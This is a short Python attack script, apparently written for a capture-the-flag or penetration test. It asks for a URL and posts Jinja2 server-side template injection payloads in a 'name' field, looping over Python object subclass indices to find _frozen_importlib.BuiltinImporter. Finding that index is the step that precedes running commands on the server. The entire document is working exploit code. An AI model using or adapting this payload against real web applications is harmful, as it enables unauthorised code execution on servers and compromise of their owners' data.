import requests

url = input("请输入你的URL链接")
for i in range(500):
    data = {"name": "{{().__class__.__base__[0].__subclasses__()[" + str(i) + "]}}"}
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            if '_frozen_importlib.BuiltinImporter' in response.text:
                print(i)
    except:
        pass
